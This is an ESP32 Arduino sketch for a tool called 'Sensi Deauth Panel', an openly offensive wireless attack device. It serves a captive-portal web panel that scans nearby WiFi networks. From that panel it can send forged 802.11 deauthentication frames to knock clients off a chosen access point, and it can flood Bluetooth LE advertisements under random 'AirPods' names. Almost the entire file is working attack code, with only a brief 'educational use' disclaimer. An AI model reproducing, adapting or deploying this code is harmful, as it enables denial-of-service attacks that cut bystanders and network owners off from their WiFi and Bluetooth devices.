/*
 * Sensi Deauth Panel - ESP32 WiFi & Bluetooth Attack Tool
 *
 * Strictly for educational and authorized testing purposes.
 * By using this software, you agree to take full responsibility for your actions.
 *
 * Features:
 * - SoftAP with static IP 192.168.69.1
 * - Mobile-responsive web UI
 * - WiFi Scanner
 * - WiFi Deauthentication Attack
 * - Bluetooth LE Advertising Flood
 * - Real-time status and logs via WebSockets
 * - Captive Portal to auto-launch the UI
 */

// Core Libraries
#include <WiFi.h>
#include <esp_wifi.h>

// Web Server Libraries
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// Bluetooth Libraries
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

// ================================================================
//                       CONFIGURATION
// ================================================================
const char *ssid = "Sensi Deauth Panel";
const char *password = "password123";

// Static IP configuration
IPAddress local_IP(192, 168, 69, 1);
IPAddress gateway(192, 168, 69, 1);
IPAddress subnet(255, 255, 255, 0);

// ================================================================
//                       GLOBAL VARIABLES
// ================================================================
AsyncWebServer server(80);
DNSServer dnsServer;
AsyncWebSocket ws("/ws");

// Attack state flags
bool deauthRunning = false;
bool bleFloodRunning = false;
unsigned long attackStartTime = 0;

// Deauth target info
uint8_t target_bssid[6];
int target_channel;

// For tracking uptime
unsigned long startTime = 0;

// ================================================================
//                       WEB UI (HTML/CSS/JS)
// ================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sensi Deauth Panel</title>
    <style>
        :root {
            --bg-color: #1a1a1a;
            --text-color: #e0e0e0;
            --primary-color: #007bff;
            --danger-color: #dc3545;
            --success-color: #28a745;
            --card-bg: #2c2c2c;
            --border-color: #444;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 15px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header h1 {
            margin: 0;
            color: var(--primary-color);
        }
        .card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        h2 {
            margin-top: 0;
            border-bottom: 2px solid var(--primary-color);
            padding-bottom: 5px;
            margin-bottom: 15px;
        }
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
        }
        .status-item {
            background-color: var(--bg-color);
            padding: 10px;
            border-radius: 5px;
            text-align: center;
        }
        .status-item span {
            display: block;
            font-size: 0.9em;
            color: #aaa;
        }
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            width: 100%;
            margin-top: 10px;
        }
        button:hover {
            opacity: 0.9;
        }
        button.btn-danger { background-color: var(--danger-color); }
        button.btn-success { background-color: var(--success-color); }
        select, input {
            width: 100%;
            padding: 10px;
            background-color: var(--bg-color);
            color: var(--text-color);
            border: 1px solid var(--border-color);
            border-radius: 5px;
            margin-bottom: 10px;
        }
        #log-container {
            background-color: #000;
            border: 1px solid var(--border-color);
            border-radius: 5px;
            height: 200px;
            overflow-y: scroll;
            padding: 10px;
            font-family: "Courier New", Courier, monospace;
            font-size: 0.9em;
            white-space: pre-wrap;
        }
        .warning-banner {
            background-color: var(--danger-color);
            color: white;
            padding: 10px;
            text-align: center;
            border-radius: 5px;
            margin-bottom: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Sensi Deauth Panel</h1>
            <p>ESP32 Network Test Tool</p>
        </div>

        <div class="warning-banner">
            ⚠️ For Educational & Testing Purposes ONLY. Use responsibly on your own devices.
        </div>

        <div class="card">
            <h2>Device Status</h2>
            <div class="status-grid">
                <div class="status-item"><span id="uptime">--</span>Uptime</div>
                <div class="status-item"><span id="ip-address">192.168.69.1</span>IP Address</div>
                <div class="status-item"><span id="attack-mode">IDLE</span>Mode</div>
            </div>
        </div>

        <div class="card">
            <h2>WiFi Attack</h2>
            <button id="scan-wifi" class="btn-success">Scan for WiFi Networks</button>
            <select id="ssid-select" disabled>
                <option>Scan first...</option>
            </select>
            <button id="start-deauth" class="btn-danger" disabled>Start Deauth Attack</button>
        </div>

        <div class="card">
            <h2>Bluetooth Attack</h2>
            <button id="start-ble-flood" class="btn-danger">Start BLE Spam</button>
        </div>

        <div class="card">
            <button id="stop-all" class="btn-danger" style="background-color: #ffc107; color: black;" disabled>Stop All Attacks</button>
        </div>

        <div class="card">
            <h2>Live Logs</h2>
            <div id="log-container"></div>
        </div>
    </div>

    <script>
        const ws = new WebSocket(`ws://${window.location.host}/ws`);
        const logContainer = document.getElementById('log-container');

        const uptimeElem = document.getElementById('uptime');
        const attackModeElem = document.getElementById('attack-mode');
        const scanBtn = document.getElementById('scan-wifi');
        const ssidSelect = document.getElementById('ssid-select');
        const startDeauthBtn = document.getElementById('start-deauth');
        const startBleBtn = document.getElementById('start-ble-flood');
        const stopAllBtn = document.getElementById('stop-all');

        function addLog(message) {
            logContainer.innerHTML += message + '<br>';
            logContainer.scrollTop = logContainer.scrollHeight;
        }

        ws.onopen = () => addLog('SYSTEM: WebSocket connection established.');
        ws.onmessage = (event) => addLog(event.data);
        ws.onclose = () => addLog('SYSTEM: WebSocket connection lost. Please refresh.');

        function formatUptime(seconds) {
            const d = Math.floor(seconds / (3600*24));
            const h = Math.floor(seconds % (3600*24) / 3600);
            const m = Math.floor(seconds % 3600 / 60);
            const s = Math.floor(seconds % 60);
            return `${d}d ${h}h ${m}m ${s}s`;
        }

        async function updateStatus() {
            try {
                const response = await fetch('/status');
                const data = await response.json();
                uptimeElem.textContent = formatUptime(data.uptime);
                attackModeElem.textContent = data.mode;

                const isAttacking = data.mode !== 'IDLE';
                stopAllBtn.disabled = !isAttacking;
                startDeauthBtn.disabled = isAttacking || ssidSelect.value === '';
                startBleBtn.disabled = isAttacking;
                scanBtn.disabled = isAttacking;
            } catch (e) {
                addLog('ERROR: Failed to fetch status.');
            }
        }

        scanBtn.addEventListener('click', async () => {
            addLog('WIFI: Starting scan...');
            scanBtn.textContent = 'Scanning...';
            scanBtn.disabled = true;
            try {
                const response = await fetch('/scan');
                const networks = await response.json();
                ssidSelect.innerHTML = '<option value="">-- Select a Target --</option>';
                networks.forEach(net => {
                    const option = document.createElement('option');
                    option.value = `${net.bssid}|${net.channel}`;
                    option.textContent = `(${net.rssi}dBm) ${net.ssid} [Ch: ${net.channel}]`;
                    ssidSelect.appendChild(option);
                });
                ssidSelect.disabled = false;
                startDeauthBtn.disabled = ssidSelect.value === '';
                addLog(`WIFI: Scan complete. Found ${networks.length} networks.`);
            } catch (e) {
                addLog('ERROR: WiFi scan failed.');
            }
            scanBtn.textContent = 'Scan for WiFi Networks';
            scanBtn.disabled = false;
        });
        
        ssidSelect.addEventListener('change', () => {
            startDeauthBtn.disabled = ssidSelect.value === '';
        });

        startDeauthBtn.addEventListener('click', () => {
            const selection = ssidSelect.value;
            if (!selection) {
                alert('Please select a WiFi network first.');
                return;
            }
            const [bssid, channel] = selection.split('|');
            const ssidName = ssidSelect.options[ssidSelect.selectedIndex].text.split('] ')[1] || "Selected Network";
            addLog(`ATTACK: Starting Deauth on ${ssidName}`);
            fetch(`/startDeauth?bssid=${bssid}&channel=${channel}`);
        });

        startBleBtn.addEventListener('click', () => {
            addLog('ATTACK: Starting Bluetooth LE Spam...');
            fetch('/startBleFlood');
        });

        stopAllBtn.addEventListener('click', () => {
            addLog('ATTACK: Stopping all operations...');
            fetch('/stop');
        });

        setInterval(updateStatus, 2000);
        updateStatus();
    </script>
</body>
</html>
)rawliteral";


// ================================================================
//                       HELPER FUNCTIONS
// ================================================================
void sendLog(String message) {
    ws.textAll(message);
    Serial.println(message);
}

// Function to parse BSSID string to byte array
void mac_str_to_uint8(const char* mac_str, uint8_t* mac_array) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_array[0], &mac_array[1], &mac_array[2],
           &mac_array[3], &mac_array[4], &mac_array[5]);
}

// ================================================================
//                       ATTACK PAYLOADS
// ================================================================

// 802.11 Deauthentication Frame
uint8_t deauth_frame[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Target AP
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Target AP
    0xf0, 0xff, 0x01, 0x00
};

void performDeauthAttack() {
    // Set the BSSID and source MAC in the deauth frame
    memcpy(&deauth_frame[10], target_bssid, 6);
    memcpy(&deauth_frame[16], target_bssid, 6);
    
    // Send deauth frame
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    
    // Log every few seconds to avoid spamming the logs
    static unsigned long lastLogTime = 0;
    if (millis() - lastLogTime > 2000) {
        sendLog("DEAUTH: Sending deauth packets...");
        lastLogTime = millis();
    }
}

void performBleFlood() {
    static unsigned long lastBleChangeTime = 0;
    if (millis() - lastBleChangeTime > 500) { // Change name every 500ms
        lastBleChangeTime = millis();

        BLEDevice::getAdvertising()->stop();
        
        char randomName[16];
        sprintf(randomName, "AirPods_%04X%04X", rand() % 0xFFFF, rand() % 0xFFFF);
        
        BLEDevice::init(randomName);
        BLEServer *pServer = BLEDevice::createServer();
        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
        pAdvertising->addServiceUUID("1234");
        pAdvertising->setScanResponse(true);
        pAdvertising->setMinPreferred(0x06);
        pAdvertising->setMinPreferred(0x12);
        BLEDevice::startAdvertising();
        sendLog("BLE SPAM: Advertising as " + String(randomName));
    }
}

void stopAttacks() {
    deauthRunning = false;
    bleFloodRunning = false;
    
    // Stop BLE advertising if it was running
    if (BLEDevice::getAdvertising()->isAdvertising()) {
        BLEDevice::getAdvertising()->stop();
    }
    
    // Return to normal channel
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    sendLog("SYSTEM: All attacks stopped.");
}

// ================================================================
//                       WEB SERVER HANDLERS
// ================================================================

void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    if (type == WS_EVT_CONNECT) {
        Serial.printf("WebSocket client #%u connected from %s\n", client->id(), client->remoteIP().toString().c_str());
        client->text("Welcome to Sensi Panel!");
    } else if (type == WS_EVT_DISCONNECT) {
        Serial.printf("WebSocket client #%u disconnected\n", client->id());
    }
}

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //redirect all requests to the captive portal
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
  }
};


// ================================================================
//                          SETUP
// ================================================================
void setup() {
    Serial.begin(115200);
    startTime = millis();

    // Set ESP32 to AP mode
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(local_IP, gateway, subnet);
    WiFi.softAP(ssid, password);
    
    // Start DNS server for captive portal
    dnsServer.start(53, "*", local_IP);

    Serial.println("");
    Serial.println("Sensi Deauth Panel Initialized");
    Serial.print("Connect to WiFi: ");
    Serial.println(ssid);
    Serial.print("IP address: ");
    Serial.println(WiFi.softAPIP());

    // Initialize WebSocket
    ws.onEvent(onWsEvent);
    server.addHandler(&ws);

    // --- WEB SERVER ROUTES ---

    // Root page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });

    // WiFi Scan API
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        sendLog("WIFI: Scan requested from client.");
        String json = "[";
        int n = WiFi.scanNetworks();
        if (n == 0) {
            sendLog("WIFI: No networks found.");
        } else {
            for (int i = 0; i < n; ++i) {
                if (i) json += ",";
                json += "{";
                json += "\"rssi\":" + String(WiFi.RSSI(i));
                json += ",\"ssid\":\"" + WiFi.SSID(i) + "\"";
                json += ",\"bssid\":\"" + WiFi.BSSIDstr(i) + "\"";
                json += ",\"channel\":" + String(WiFi.channel(i));
                json += "}";
            }
        }
        json += "]";
        request->send(200, "application/json", json);
    });

    // Start Deauth Attack API
    server.on("/startDeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (request->hasParam("bssid") && request->hasParam("channel")) {
            String bssid_str = request->getParam("bssid")->value();
            target_channel = request->getParam("channel")->value().toInt();
            mac_str_to_uint8(bssid_str.c_str(), target_bssid);

            stopAttacks(); // Stop any other running attack
            deauthRunning = true;
            attackStartTime = millis();

            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            sendLog("DEAUTH: Attack started on BSSID " + bssid_str + " on channel " + String(target_channel));
            request->send(200, "text/plain", "Deauth started.");
        } else {
            request->send(400, "text/plain", "Missing parameters.");
        }
    });

    // Start BLE Flood Attack API
    server.on("/startBleFlood", HTTP_GET, [](AsyncWebServerRequest *request) {
        stopAttacks(); // Stop any other running attack
        bleFloodRunning = true;
        attackStartTime = millis();
        
        srand(micros()); // Seed random number generator
        
        sendLog("BLE SPAM: Attack started.");
        request->send(200, "text/plain", "BLE Flood started.");
    });
    
    // Stop All Attacks API
    server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request) {
        stopAttacks();
        request->send(200, "text/plain", "All attacks stopped.");
    });

    // Status API
    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request){
        String mode = "IDLE";
        if (deauthRunning) mode = "DEAUTH ATTACK";
        if (bleFloodRunning) mode = "BLE SPAM";

        String json = "{";
        json += "\"uptime\":" + String(millis() / 1000);
        json += ",\"mode\":\"" + mode + "\"";
        json += "}";
        request->send(200, "application/json", json);
    });
    
    // Captive Portal Handler - This MUST be last
    server.addHandler(new CaptiveRequestHandler()).onNotFound([](AsyncWebServerRequest *request){
      request->send(404); // We shouldn't ever get here
    });

    server.begin();
}


// ================================================================
//                           MAIN LOOP
// ================================================================
void loop() {
    // Process DNS requests for captive portal
    dnsServer.processNextRequest();

    // Clean up disconnected WebSocket clients
    ws.cleanupClients();

    // Handle ongoing attacks
    if (deauthRunning) {
        performDeauthAttack();
    }

    if (bleFloodRunning) {
        performBleFlood();
    }
}
